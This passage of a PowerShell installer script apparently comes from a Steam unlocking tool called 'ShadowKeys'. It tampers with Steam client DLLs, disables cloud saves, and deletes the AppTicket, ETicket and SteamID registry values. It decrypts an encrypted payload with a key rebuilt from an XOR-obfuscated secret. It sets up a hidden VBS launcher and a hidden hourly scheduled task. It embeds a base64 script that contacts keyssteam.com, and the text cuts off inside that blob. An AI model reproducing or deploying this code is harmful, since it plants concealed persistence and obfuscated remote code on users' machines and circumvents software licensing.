      return $false
    }
  }

  function Lock-WorkingSteamClient {
    param([string]$SteamRoot)
    if (-not (Test-SteamClientDllsHealthy $SteamRoot)) { return $false }
    $uiPath = Join-Path $SteamRoot "steamui.dll"
    $clPath = Join-Path $SteamRoot "steamclient64.dll"
    $uiSha = Get-Sha256 $uiPath
    $clSha = Get-Sha256 $clPath
    if (-not $uiSha -or -not $clSha) { return $false }
    $ostDir = Join-Path $SteamRoot "opensteamtool"
    if (-not (Test-Path -LiteralPath $ostDir)) {
      New-Item -Path $ostDir -ItemType Directory -Force | Out-Null
    }
    foreach ($pair in @(
      @{ Name = "steamui.dll"; Sha = $uiSha },
      @{ Name = "steamclient64.dll"; Sha = $clSha }
    )) {
      $src = Join-Path $SteamRoot $pair.Name
      $lock = Join-Path $SteamRoot ($pair.Name + ".sk-lock")
      $bak = Join-Path $SteamRoot ($pair.Name + ".sk-bak")
      try {
        Copy-Item -LiteralPath $src -Destination $lock -Force -ErrorAction Stop
        Copy-Item -LiteralPath $src -Destination $bak -Force -ErrorAction Stop
      } catch {}
    }
    $ver = Get-SteamConsoleClientVersion $SteamRoot
    if (-not $ver -or $ver -lt 1) {
      $prevPath = Get-SteamClientLockPath $SteamRoot
      if (Test-Path -LiteralPath $prevPath) {
        try {
          $prev = Get-Content -LiteralPath $prevPath -Raw | ConvertFrom-Json
          if ($prev.clientVersion) { $ver = [int64]$prev.clientVersion }
        } catch {}
      }
    }
    $clientVersionNum = 0
    if ($ver -and $ver -ge 0) { $clientVersionNum = [int64]$ver }
    $payload = @{
      steamuiSha = $uiSha.ToUpper()
      steamclient64Sha = $clSha.ToUpper()
      clientVersion = $clientVersionNum
      lockedAt = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    } | ConvertTo-Json -Compress
    try {
      [System.IO.File]::WriteAllText((Get-SteamClientLockPath $SteamRoot), $payload, [System.Text.UTF8Encoding]::new($false))
      return $true
    } catch {
      return $false
    }
  }

  function Restore-SteamClientFromLock {
    param([string]$SteamRoot)
    $restored = $false
    foreach ($name in @("steamui.dll", "steamclient64.dll")) {
      $lock = Join-Path $SteamRoot ($name + ".sk-lock")
      $dst = Join-Path $SteamRoot $name
      if (-not (Test-Path -LiteralPath $lock)) { continue }
      try {
        if (Test-Path -LiteralPath $dst) {
          try { [IO.File]::SetAttributes($dst, [IO.FileAttributes]::Normal) } catch {}
        }
        Copy-Item -LiteralPath $lock -Destination $dst -Force -ErrorAction Stop
        $restored = $true
      } catch {}
    }
    return $restored
  }

  function Wait-SteamConsoleClientVersion {
    param(
      [Parameter(Mandatory = $true)][string]$SteamRoot,
      [int]$TimeoutSec = 600,
      [int64]$MinVersion = 1
    )
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
      Start-Sleep -Seconds 5
      $ver = Get-SteamConsoleClientVersion $SteamRoot
      if ($ver -and $ver -ge $MinVersion) { return $ver }
    }
    return $null
  }

  function Ensure-SteamClientBootstrap {
    param([string]$SteamRoot)
    if (-not (Test-SteamNeedsBootstrapRepair $SteamRoot)) { return }
    Stop-SteamFully
    Restore-SteamClientFromBackup $SteamRoot
    Restore-SteamExeFromOld $SteamRoot
    Disable-SteamFastBootCfg $SteamRoot
    Clear-SteamBootstrapPending $SteamRoot
    $exe = Join-Path $SteamRoot "steam.exe"
    if (-not (Test-Path -LiteralPath $exe)) { return }
    try {
      Start-Process -FilePath $exe -WorkingDirectory $SteamRoot -ArgumentList '-foreground' -ErrorAction Stop | Out-Null
    } catch {
      return
    }
    [void](Wait-SteamConsoleClientVersion -SteamRoot $SteamRoot -TimeoutSec 600)
    Stop-SteamFully
    if (Test-SteamClientWorking $SteamRoot) {
      [void](Lock-WorkingSteamClient $SteamRoot)
    }
  }

  function Ensure-SteamShortcutArgs {
    param([string]$SteamRoot)
    $args = '-clearbeta -cef-disable-gpu -cef-disable-gpu-compositing -foreground'
    $exe = Join-Path $SteamRoot 'steam.exe'
    $candidates = @(
      (Join-Path $env:PUBLIC 'Desktop\Steam.lnk'),
      (Join-Path $env:USERPROFILE 'Desktop\Steam.lnk'),
      (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Steam\Steam.lnk')
    )
    $shell = New-Object -ComObject WScript.Shell
    foreach ($lnk in ($candidates | Select-Object -Unique)) {
      $dir = Split-Path -Parent $lnk
      if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        try { New-Item -Path $dir -ItemType Directory -Force | Out-Null } catch {}
      }
      try {
        $tmp = Join-Path $env:TEMP ('sk-steam-' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.lnk')
        $sc = $shell.CreateShortcut($tmp)
        $sc.TargetPath = $exe
        $sc.WorkingDirectory = $SteamRoot
        $sc.Arguments = $args
        $sc.IconLocation = ($exe + ',0')
        $sc.Save()
        Copy-Item -LiteralPath $tmp -Destination $lnk -Force -ErrorAction Stop
        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
      } catch {
        try {
          if (-not (Test-Path -LiteralPath $lnk)) { continue }
          $sc = $shell.CreateShortcut($lnk)
          if ($sc.TargetPath -and ($sc.TargetPath -match '(?i)steam\.exe$')) {
            $sc.Arguments = $args
            $sc.Save()
          }
        } catch {}
      }
    }
  }

  function Ensure-SteamClientPin {
    param([string]$SteamRoot)
    $verNow = Get-SteamConsoleClientVersion $SteamRoot
    if ($verNow -eq 0) {
      [void](Restore-SteamClientFromLock $SteamRoot)
      Disable-SteamFastBootCfg $SteamRoot
    }
    Backup-SteamClientDlls $SteamRoot
    Repair-SteamClientDlls $SteamRoot
    Remove-SteamBeta $SteamRoot
    Clear-SteamBootstrapPending $SteamRoot
    Repair-SteamUiIndexHtml $SteamRoot
    Ensure-SteamGpuWebViewsDisabled
    Ensure-SteamShortcutArgs $SteamRoot
    if (Test-SteamClientWorking $SteamRoot) {
      if (-not (Test-SteamClientPinned $SteamRoot)) {
        Disable-SteamFastBootCfg $SteamRoot
      }
      [void](Lock-WorkingSteamClient $SteamRoot)
      Install-SteamOstPatternCache $SteamRoot
      return
    }
    if (Test-SteamClientPinned $SteamRoot) {
      $script:SteamClientPinned = $true
      Ensure-SteamFastBootCfg $SteamRoot -Pinned
      Install-SteamOstPatternCache $SteamRoot
      return
    }
    if (Test-SteamClientSupported $SteamRoot) {
      Install-SteamOstPatternCache $SteamRoot
      return
    }
    $reason = Install-SteamClientPinDll $SteamRoot
    if (-not $reason) {
      $script:SteamClientPinned = $true
      Ensure-SteamFastBootCfg $SteamRoot -Pinned
      Install-SteamOstPatternCache $SteamRoot
    } else {
      Repair-SteamClientDlls $SteamRoot
      Install-SteamOstPatternCache $SteamRoot
    }
    Ensure-SteamGpuWebViewsDisabled
    Ensure-SteamShortcutArgs $SteamRoot
    Repair-SteamUiIndexHtml $SteamRoot
  }


  

  function Get-SteamAccountId64 {
    param([string]$SteamRoot)
    $vdf = Join-Path $SteamRoot "config\loginusers.vdf"
    if (-not (Test-Path -LiteralPath $vdf)) { return $null }
    try {
      $text = [System.IO.File]::ReadAllText($vdf)
      $bestId = $null
      $bestTs = [int64]0
      $bestRecent = $false
      foreach ($m in [regex]::Matches($text, '"(\d{17})"\s*\{([^}]*)\}')) {
        $id = $m.Groups[1].Value
        $block = $m.Groups[2].Value
        $recent = $block -match '(?i)"MostRecent"\s*"1"'
        $ts = [int64]0
        if ($block -match '(?i)"Timestamp"\s*"(\d+)"') { [void][int64]::TryParse($Matches[1], [ref]$ts) }
        if ($recent -and -not $bestRecent) {
          $bestId = $id; $bestTs = $ts; $bestRecent = $true; continue
        }
        if ($bestRecent) { continue }
        if (-not $bestId -or $ts -ge $bestTs) { $bestId = $id; $bestTs = $ts }
      }
      return $bestId
    } catch {
      return $null
    }
  }

  function Test-SteamFsPath {
    param([string]$Path)
    if (-not $Path) { return $false }
    try {
      if ([System.IO.Directory]::Exists($Path)) { return $true }
      if ([System.IO.File]::Exists($Path)) { return $true }
    } catch {}
    return $false
  }

  function Get-LibraryAppIds {
    param([string]$SteamRoot)
    $roots = @($SteamRoot)
    $lf = Join-Path $SteamRoot "steamapps\libraryfolders.vdf"
    if (Test-SteamFsPath $lf) {
      try {
        $text = [System.IO.File]::ReadAllText($lf)
        foreach ($m in [regex]::Matches($text, '(?i)"path"\s*"([^"]+)"')) {
          $p = ($m.Groups[1].Value -replace '\\', '\\').Trim()
          if (-not $p) { continue }
          $apps = Join-Path $p 'steamapps'
          if (Test-SteamFsPath $apps) { $roots += $p }
        }
      } catch {}
    }
    $ids = New-Object 'System.Collections.Generic.HashSet[string]'
    foreach ($root in ($roots | Select-Object -Unique)) {
      $dir = Join-Path $root 'steamapps'
      if (-not (Test-SteamFsPath $dir)) { continue }
      try {
        Get-ChildItem -LiteralPath $dir -Filter 'appmanifest_*.acf' -ErrorAction SilentlyContinue | ForEach-Object {
          if ($_.Name -match 'appmanifest_(\d+)\.acf') { [void]$ids.Add($Matches[1]) }
        }
      } catch {}
    }
    return ,@($ids | Sort-Object)
  }

  function Find-VdfBlockRange {
    param([string]$Text, [string]$Marker, [int]$From = 0)
    $pos = $Text.IndexOf($Marker, $From)
    if ($pos -lt 0) { return $null }
    $braceStart = $Text.IndexOf('{', $pos + $Marker.Length)
    if ($braceStart -lt 0) { return $null }
    $depth = 1
    $i = $braceStart + 1
    while ($i -lt $Text.Length -and $depth -gt 0) {
      $ch = $Text[$i]
      if ($ch -eq '{') { $depth++ }
      elseif ($ch -eq '}') { $depth-- }
      $i++
    }
    if ($depth -ne 0) { return $null }
    return @{ InnerStart = $braceStart + 1; InnerEnd = $i - 1 }
  }

  function Build-AppCloudEntry {
    param([string]$AppId)
    $lines = @(
      '				"' + $AppId + '"',
      '				{',
      '					"cloudenabled"		"0"',
      '				}'
    )
    return ($lines -join [Environment]::NewLine)
  }

  function Set-AppCloudDisabled {
    param([ref]$AppsBlock, [string]$AppId)
    $marker = '"' + $AppId + '"'
    $range = Find-VdfBlockRange -Text $AppsBlock.Value -Marker $marker
    if ($range) {
      $inner = $AppsBlock.Value.Substring($range.InnerStart, $range.InnerEnd - $range.InnerStart)
      $updated = $inner
      if ($updated -match '(?i)"cloudenabled"\s*"\s*1\s*"') {
        $updated = [regex]::Replace($updated, '(?i)"cloudenabled"\s*"\s*1\s*"', '"cloudenabled"		"0"')
      } elseif ($updated -notmatch '(?i)"cloudenabled"\s*"\s*0\s*"') {
        $updated = [Environment]::NewLine + '					"cloudenabled"		"0"' + $updated
      } else {
        return $false
      }
      $AppsBlock.Value = $AppsBlock.Value.Remove($range.InnerStart, $range.InnerEnd - $range.InnerStart).Insert($range.InnerStart, $updated)
      return $true
    }
    $AppsBlock.Value = $AppsBlock.Value + [Environment]::NewLine + (Build-AppCloudEntry -AppId $AppId)
    return $true
  }

  function Merge-SharedConfigCloud {
    param([string]$Text, [string[]]$AppIds)
    $result = [regex]::Replace($Text, '(?i)"cloudenabled"\s*"\s*1\s*"', '"cloudenabled"		"0"')
    $result = [regex]::Replace($result, '(?i)"CloudEnabled"\s*"\s*1\s*"', '"CloudEnabled"		"0"')

    if ($result -notmatch '"UserRoamingConfigStore"') {
      $appsLines = @('				"Apps"', '				{')
      foreach ($appId in $AppIds) {
        $appsLines += '				"' + $appId + '"'
        $appsLines += '				{'
        $appsLines += '					"cloudenabled"		"0"'
        $appsLines += '				}'
      }
      $appsLines += '				}'
      $appsSection = $appsLines -join [Environment]::NewLine
      return '"UserRoamingConfigStore"' + [Environment]::NewLine + '{' + [Environment]::NewLine +
        '	"Software"' + [Environment]::NewLine + '	{' + [Environment]::NewLine +
        '		"Valve"' + [Environment]::NewLine + '		{' + [Environment]::NewLine +
        '			"Steam"' + [Environment]::NewLine + '			{' + [Environment]::NewLine +
        '				"CloudEnabled"		"0"' + [Environment]::NewLine +
        $appsSection + [Environment]::NewLine +
        '			}' + [Environment]::NewLine + '		}' + [Environment]::NewLine + '	}' + [Environment]::NewLine + '}' + [Environment]::NewLine
    }

    $steamRange = Find-VdfBlockRange -Text $result -Marker '"Steam"'
    if (-not $steamRange) { return $result }

    $steamBlock = $result.Substring($steamRange.InnerStart, $steamRange.InnerEnd - $steamRange.InnerStart)
    $steamBefore = $steamBlock

    if ($steamBlock -match '(?i)"CloudEnabled"\s*"\s*1\s*"') {
      $steamBlock = [regex]::Replace($steamBlock, '(?i)"CloudEnabled"\s*"\s*1\s*"', '"CloudEnabled"		"0"')
    } elseif ($steamBlock -notmatch '(?i)"CloudEnabled"\s*"\s*0\s*"') {
      $steamBlock = [Environment]::NewLine + '				"CloudEnabled"		"0"' + $steamBlock
    }

    $appsRange = Find-VdfBlockRange -Text $steamBlock -Marker '"Apps"'
    if (-not $appsRange) {
      if ($AppIds.Count -gt 0) {
        $appsLines = @('				"Apps"', '				{')
        foreach ($appId in $AppIds) {
          $appsLines += '				"' + $appId + '"'
          $appsLines += '				{'
          $appsLines += '					"cloudenabled"		"0"'
          $appsLines += '				}'
        }
        $appsLines += '				}'
        $steamBlock += [Environment]::NewLine + ($appsLines -join [Environment]::NewLine)
      }
    } else {
      $appsBlock = $steamBlock.Substring($appsRange.InnerStart, $appsRange.InnerEnd - $appsRange.InnerStart)
      $appsBefore = $appsBlock
      foreach ($appId in $AppIds) {
        [void](Set-AppCloudDisabled -AppsBlock ([ref]$appsBlock) -AppId $appId)
      }
      if ($appsBlock -ne $appsBefore) {
        $steamBlock = $steamBlock.Remove($appsRange.InnerStart, $appsRange.InnerEnd - $appsRange.InnerStart).Insert($appsRange.InnerStart, $appsBlock)
      }
    }

    if ($steamBlock -ne $steamBefore) {
      $result = $result.Remove($steamRange.InnerStart, $steamRange.InnerEnd - $steamRange.InnerStart).Insert($steamRange.InnerStart, $steamBlock)
    }

    return $result
  }

  function Ensure-SteamCloudDisabledAll {
    param([string]$SteamRoot)
    try {
      $steamId64 = Get-SteamAccountId64 $SteamRoot
      if (-not $steamId64) { return }
      $accountId = [string]([uint64]$steamId64 - [uint64]76561197960265728)
      $cfgDir = Join-Path $SteamRoot ("userdata\{0}\7\remote" -f $accountId)
      if (-not (Test-Path -LiteralPath $cfgDir)) { New-Item -Path $cfgDir -ItemType Directory -Force *> $null }
      $cfgPath = Join-Path $cfgDir 'sharedconfig.vdf'
      $appIds = Get-LibraryAppIds $SteamRoot
      $existing = ''
      if (Test-Path -LiteralPath $cfgPath) {
        $existing = [System.IO.File]::ReadAllText($cfgPath)
      }
      $merged = Merge-SharedConfigCloud -Text $existing -AppIds $appIds
      if ($merged -ne $existing) {
        [System.IO.File]::WriteAllText($cfgPath, $merged, [System.Text.UTF8Encoding]::new($false))
      }
    } catch {}
  }



  
  function Get-SkOstPayloadPepper {
    $mask = @(167, 179, 194, 212, 229, 241, 154, 78)
    $enc = @(
    @(244, 219, 246, 176, 213, 134, 209, 125, 222, 192, 227),
    @(244, 216, 242, 167, 145, 210, 234, 47, 222),
    @(203, 131, 163, 176, 186, 195, 170, 124, 145)
    )
    $parts = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $enc.Count; $i++) {
      $chars = New-Object System.Collections.Generic.List[char]
      for ($j = 0; $j -lt $enc[$i].Count; $j++) {
        $chars.Add([char]($enc[$i][$j] -bxor $mask[$j % $mask.Count]))
      }
      $parts.Add(-join $chars)
    }
    return -join $parts
  }

  function Get-SkOstPayloadKey([string]$ReleaseTag) {
    $tag = (($ReleaseTag + "").Trim()).TrimStart('v','V')
    $pepper = Get-SkOstPayloadPepper
    $utf8 = [System.Text.Encoding]::UTF8
    $ms = New-Object System.IO.MemoryStream
    $bw = New-Object System.IO.BinaryWriter $ms
    $bw.Write($utf8.GetBytes("SKOST1"))
    $bw.Write([byte]0)
    $bw.Write($utf8.GetBytes($tag))
    $bw.Write([byte]0)
    $bw.Write($utf8.GetBytes($pepper))
    $bw.Flush()
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try { return $sha.ComputeHash($ms.ToArray()) } finally { $sha.Dispose(); $ms.Dispose(); $bw.Dispose() }
  }

  function Decrypt-SkOstPayloadFile([string]$EncPath, [string]$ReleaseTag, [string]$OutPath) {
    $blob = [System.IO.File]::ReadAllBytes($EncPath)
    if ($blob.Length -lt 53) { throw "payload-short" }
    if ($blob[0] -ne 0x53 -or $blob[1] -ne 0x4b -or $blob[2] -ne 0x45 -or $blob[3] -ne 0x4e) { throw "payload-magic" }
    if ($blob[4] -ne 1) { throw "payload-version" }
    $iv = $blob[5..20]
    $mac = $blob[($blob.Length - 32)..($blob.Length - 1)]
    $encrypted = $blob[21..($blob.Length - 33)]
    $key = Get-SkOstPayloadKey $ReleaseTag
    $hmac = New-Object System.Security.Cryptography.HMACSHA256 (,$key)
    try {
      $ms = New-Object System.IO.MemoryStream
      $ms.Write($iv, 0, $iv.Length)
      $ms.Write($encrypted, 0, $encrypted.Length)
      $expected = $hmac.ComputeHash($ms.ToArray())
      $ms.Dispose()
      for ($i = 0; $i -lt 32; $i++) {
        if ($expected[$i] -ne $mac[$i]) { throw "payload-hmac" }
      }
    } finally {
      $hmac.Dispose()
    }
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    try {
      $plain = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
      [System.IO.File]::WriteAllBytes($OutPath, $plain)
    } finally {
      $decryptor.Dispose()
      $aes.Dispose()
    }
  }


  
function Get-SkSteamId64([string]$SteamRoot) {
  $vdf = Join-Path $SteamRoot "config\\loginusers.vdf"
  if (-not (Test-Path -LiteralPath $vdf)) { return $null }
  try {
    $raw = [System.IO.File]::ReadAllText($vdf)
    $blocks = [regex]::Matches($raw, '"(\d{17})"\s*\{([^}]*)\}')
    $bestId = $null
    $bestRecent = $false
    foreach ($block in $blocks) {
      $id = $block.Groups[1].Value
      $body = $block.Groups[2].Value
      $recent = $body -match '"MostRecent"\s*"1"'
      if (-not $bestId -or ($recent -and -not $bestRecent)) {
        $bestId = $id
        $bestRecent = [bool]$recent
      }
    }
    return $bestId
  } catch {
    return $null
  }
}

function Add-SkLegacyAppId([System.Collections.Generic.HashSet[string]]$Set, [string]$AppId) {
  if ($AppId -and $AppId -match '^[0-9]+$') {
    [void]$Set.Add($AppId)
  }
}

function Add-SkLegacyAppIdsFromJsonMap([System.Collections.Generic.HashSet[string]]$Set, [string]$JsonText) {
  if (-not $JsonText -or -not $JsonText.Trim()) { return }
  try {
    $obj = $JsonText | ConvertFrom-Json
    foreach ($prop in $obj.PSObject.Properties) {
      Add-SkLegacyAppId $Set $prop.Name
    }
  } catch {}
}

function Collect-SkLegacyAppIds([string]$SteamRoot, [string]$SteamId64) {
  $appIds = New-Object 'System.Collections.Generic.HashSet[string]'

  $luaDir = Join-Path $SteamRoot "config\\lua"
  if (Test-Path -LiteralPath $luaDir) {
    foreach ($file in @(Get-ChildItem -LiteralPath $luaDir -Filter "*.lua" -File -ErrorAction SilentlyContinue)) {
      Add-SkLegacyAppId $appIds $file.BaseName
    }
  }

  $extDir = Join-Path $SteamRoot "ext"
  if (Test-Path -LiteralPath $extDir) {
    foreach ($file in @(Get-ChildItem -LiteralPath $extDir -Filter "sk-denuvo-*.json" -File -ErrorAction SilentlyContinue)) {
      if ($file.BaseName -match '^sk-denuvo-(\d+)$') {
        Add-SkLegacyAppId $appIds $Matches[1]
      }
    }
    $appliedFixes = Join-Path $extDir "sk-applied-fixes.json"
    if (Test-Path -LiteralPath $appliedFixes) {
      try { Add-SkLegacyAppIdsFromJsonMap $appIds ([System.IO.File]::ReadAllText($appliedFixes)) } catch {}
    }
  }

  $bypassDir = Join-Path $SteamRoot "opensteamtool\\bypass"
  if (Test-Path -LiteralPath $bypassDir) {
    foreach ($file in @(Get-ChildItem -LiteralPath $bypassDir -Filter "*.json" -File -ErrorAction SilentlyContinue)) {
      try { Add-SkLegacyAppIdsFromJsonMap $appIds ([System.IO.File]::ReadAllText($file.FullName)) } catch {}
    }
  }

  if ($SteamId64) {
    $clientState = Join-Path $SteamRoot ("opensteamtool\\client\\{0}.sk" -f $SteamId64)
    if (Test-Path -LiteralPath $clientState) {
      try {
        $raw = [System.IO.File]::ReadAllText($clientState)
        $obj = $raw | ConvertFrom-Json
        if ($obj.apps) {
          foreach ($prop in $obj.apps.PSObject.Properties) {
            Add-SkLegacyAppId $appIds $prop.Name
          }
        }
      } catch {}
    }

    $legacyAccountDir = Join-Path $SteamRoot ("opensteamtool\\store\\{0}" -f $SteamId64)
    if (Test-Path -LiteralPath $legacyAccountDir) {
      foreach ($file in @(Get-ChildItem -LiteralPath $legacyAccountDir -Filter "*.sk" -File -ErrorAction SilentlyContinue)) {
        Add-SkLegacyAppId $appIds $file.BaseName
      }
    }
  }

  return ,$appIds
}

function Clear-SkSteamAppRegistryCredentials([string]$AppId) {
  if ($AppId -notmatch '^[0-9]+$') { return $false }
  $keyPath = "HKCU:\\Software\\Valve\\Steam\\Apps\\$AppId"
  if (-not (Test-Path -LiteralPath $keyPath)) { return $false }
  $changed = $false
  foreach ($name in @("AppTicket", "ETicket", "SteamID")) {
    try {
      Remove-ItemProperty -LiteralPath $keyPath -Name $name -ErrorAction Stop
      $changed = $true
    } catch {}
  }
  return $changed
}

function Remove-SkLegacyLuaDirs([string]$SteamRoot) {
  foreach ($rel in @("config\\lua", "config\\stplug-in")) {
    $dir = Join-Path $SteamRoot $rel
    if (-not (Test-Path -LiteralPath $dir)) { continue }
    try { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction Stop } catch {}
  }
}

function Test-SkMillenniumMigration([string]$SteamRoot) {
  if (Test-Path -LiteralPath (Join-Path $SteamRoot "millennium")) { return $true }
  if (Test-Path -LiteralPath (Join-Path $SteamRoot "plugins")) { return $true }
  foreach ($name in @("millennium.dll", "millennium.hhx64.dll", "python311.dll", "wsock32.dll", "version.dll")) {
    if (Test-Path -LiteralPath (Join-Path $SteamRoot $name)) { return $true }
  }
  if (Test-Path -LiteralPath (Join-Path $SteamRoot "ext\\.sk-millennium-version")) { return $true }
  return $false
}

function Invoke-SkOstLegacyMigrationCleanup([string]$SteamRoot) {
  $steamId64 = Get-SkSteamId64 $SteamRoot
  $appIds = Collect-SkLegacyAppIds $SteamRoot $steamId64
  $isMillenniumMigration = Test-SkMillenniumMigration $SteamRoot
  $credentialCleared = 0

  foreach ($appId in $appIds) {
    if (Clear-SkSteamAppRegistryCredentials $appId) { $credentialCleared++ }
  }

  $extDir = Join-Path $SteamRoot "ext"
  if (Test-Path -LiteralPath $extDir) {
    foreach ($file in @(Get-ChildItem -LiteralPath $extDir -Filter "sk-denuvo-*.json" -File -ErrorAction SilentlyContinue)) {
      try { Remove-Item -LiteralPath $file.FullName -Force -ErrorAction SilentlyContinue } catch {}
    }
    foreach ($marker in @("sk-applied-fixes.json", "config.json", ".sk-millennium-version", "sk-reactivate.flag")) {
      $path = Join-Path $extDir $marker
      if (Test-Path -LiteralPath $path) {
        try { Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue } catch {}
      }
    }
  }

  $bypassDir = Join-Path $SteamRoot "opensteamtool\\bypass"
  if (Test-Path -LiteralPath $bypassDir) {
    try { Remove-Item -LiteralPath $bypassDir -Recurse -Force -ErrorAction SilentlyContinue } catch {}
  }

  if ($isMillenniumMigration) {
    Remove-SkLegacyLuaDirs $SteamRoot

    if ($steamId64) {
      $clientState = Join-Path $SteamRoot ("opensteamtool\\client\\{0}.sk" -f $steamId64)
      if (Test-Path -LiteralPath $clientState) {
        try { Remove-Item -LiteralPath $clientState -Force -ErrorAction SilentlyContinue } catch {}
      }
    }
  }

  return @{
    SteamId64 = $steamId64
    AppIds = @($appIds)
    CredentialsCleared = $credentialCleared
    MillenniumMigration = $isMillenniumMigration
  }
}


  
function Write-HiddenPsLauncherVbs {
  param(
    [Parameter(Mandatory = $true)][string]$VbsPath,
    [Parameter(Mandatory = $true)][string]$Ps1Path
  )
  $runCmd = 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $Ps1Path + '"'
  $vbsBody = 'CreateObject("WScript.Shell").Run "' + ($runCmd.Replace('"', '""')) + '", 0, False'
  Set-Content -LiteralPath $VbsPath -Value $vbsBody -Encoding ASCII
}

function Start-HiddenPsViaVbs {
  param([Parameter(Mandatory = $true)][string]$VbsPath)
  if (-not (Test-Path -LiteralPath $VbsPath)) { return $false }
  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = Join-Path $env:SystemRoot 'System32\wscript.exe'
    $psi.Arguments = '//B "' + $VbsPath + '"'
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    return $true
  } catch {
    return $false
  }
}

function Register-HiddenPsScheduledTask {
  param(
    [Parameter(Mandatory = $true)][string]$TaskName,
    [Parameter(Mandatory = $true)][string]$VbsPath,
    [Parameter(Mandatory = $true)][int]$IntervalMinutes,
    [int]$InitialDelayMinutes = 2
  )
  if (-not (Test-Path -LiteralPath $VbsPath)) { return $false }
  $wscript = Join-Path $env:SystemRoot 'System32\wscript.exe'
  try {
    try {
      Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    } catch {}
    $action = New-ScheduledTaskAction -Execute $wscript -Argument ('//B "' + $VbsPath + '"')
    $start = (Get-Date).AddMinutes($InitialDelayMinutes)
    $repeat = New-ScheduledTaskTrigger -Once -At $start -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) -RepetitionDuration (New-TimeSpan -Days 365)
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 10) -Hidden
    $prevWarn = $WarningPreference
    $WarningPreference = 'SilentlyContinue'
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $repeat -Settings $settings -Force | Out-Null
    $WarningPreference = $prevWarn
    return $true
  } catch {
    $script:SkLastTaskError = $_.Exception.Message
  }
  try {
    $sch = Join-Path $env:SystemRoot 'System32\schtasks.exe'
    $tr = 'wscript.exe //B ' + $VbsPath
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    & $sch /Create /TN $TaskName /TR $tr /SC MINUTE /MO $IntervalMinutes /F 2>$null | Out-Null
    $code = $LASTEXITCODE
    $ErrorActionPreference = $prevEap
    if ($code -eq 0) { return $true }
    $script:SkLastTaskError = ('schtasks ' + $code)
  } catch {
    $script:SkLastTaskError = $_.Exception.Message
  }
  return $false
}

$script:SkLuaRepairTaskName = "SK-LuaRepair"
$script:SkLuaRepairLegacyTaskNames = @("ShadowKeys-LuaRepair")
$script:SkLuaRepairIntervalMinutes = 60


function Get-LuaRepairScriptPath([string]$SteamRoot) {
  return Join-Path $SteamRoot 'opensteamtool\lua-repair.ps1'
}

function Get-LuaRepairLauncherPath([string]$SteamRoot) {
  $dir = Join-Path $env:LOCALAPPDATA 'ShadowKeys'
  if (-not (Test-Path -LiteralPath $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
  }
  return Join-Path $dir 'lua-repair-launch.vbs'
}

function Ensure-LuaRepairScript {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  $ostDir = Join-Path $SteamRoot 'opensteamtool'
  if (-not (Test-Path -LiteralPath $ostDir)) {
    New-Item -Path $ostDir -ItemType Directory -Force | Out-Null
  }
  $scriptPath = Get-LuaRepairScriptPath $SteamRoot
  $bytes = [Convert]::FromBase64String('JGFwaUJhc2UgPSAiaHR0cHM6Ly9rZXlzc3RlYW0uY29tIgokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKW0NvbnNvbGVdOjpPdXRwdXRFbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgKCgpmdW5jdGlvbiBUZXN0LVN0ZWFtRHJpdmVSZWFkeSB7CiAgcGFyYW0oW3N0cmluZ10kUGF0aCkKICBpZiAoLW5vdCAkUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICB0cnkgewogICAgJHJvb3QgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRQYXRoUm9vdCgkUGF0aCkKICAgIGlmICgtbm90ICRyb290KSB7IHJldHVybiAkZmFsc2UgfQogICAgaWYgKCRyb290LlN0YXJ0c1dpdGgoJ1xcJykpIHsKICAgICAgdHJ5IHsgcmV0dXJuIFtTeXN0ZW0uSU8uRGlyZWN0b3J5XTo6RXhpc3RzKCRyb290KSB9IGNhdGNoIHsgcmV0dXJuICRmYWxzZSB9CiAgICB9CiAgICBmb3JlYWNoICgkZCBpbiBbU3lzdGVtLklPLkRyaXZlSW5mb106OkdldERyaXZlcygpKSB7CiAgICAgIGlmICgkZC5OYW1lIC1lcSAkcm9vdCkgeyByZXR1cm4gJGQuSXNSZWFkeSB9CiAgICB9CiAgICByZXR1cm4gJGZhbHNlCiAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQp9CgpmdW5jdGlvbiBUZXN0LVN0ZWFtRnNQYXRoIHsKICBwYXJhbShbc3RyaW5nXSRQYXRoKQogIGlmICgtbm90ICRQYXRoKSB7IHJldHVybiAkZmFsc2UgfQogIGlmICgtbm90IChUZXN0LVN0ZWFtRHJpdmVSZWFkeSAkUGF0aCkpIHsgcmV0dXJuICRmYWxzZSB